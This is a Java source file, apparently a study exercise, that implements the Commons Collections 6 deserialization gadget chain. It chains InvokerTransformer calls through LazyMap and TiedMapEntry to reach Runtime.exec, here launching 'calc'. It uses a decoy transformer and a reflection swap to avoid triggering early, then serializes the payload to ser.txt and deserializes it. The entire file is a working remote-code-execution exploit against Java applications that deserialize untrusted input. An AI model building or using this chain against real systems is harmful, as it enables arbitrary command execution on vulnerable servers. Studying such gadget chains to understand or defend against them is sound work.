package top.foreverwl.cc6_v1.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @program: CC6_v1
 * @description:
 * @author: 168
 * @create: 2024-07-17 15:49
 **/
public class Cc6My {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        Transformer[] facktransformer=new Transformer[]{new ConstantTransformer(1)};

//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        ChainedTransformer chainedTransformer = new ChainedTransformer(facktransformer);
        Map nomap=new HashMap();
        Map lazymap= LazyMap.decorate(nomap, chainedTransformer);

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap,"key1");
//        tiedMapEntry.hashCode();
        HashMap<Object, Object> expmap = new HashMap<>();
        expmap.put(tiedMapEntry,"168");
        lazymap.remove("key1");
        Field f=ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer,transformer);

        serialize(expmap);
        unserialize("ser.txt");

    }
    public static void serialize(Object object) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("ser.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("1.序列化成功");
    }

    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(filename);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("2.反序列化成功");
    }
}
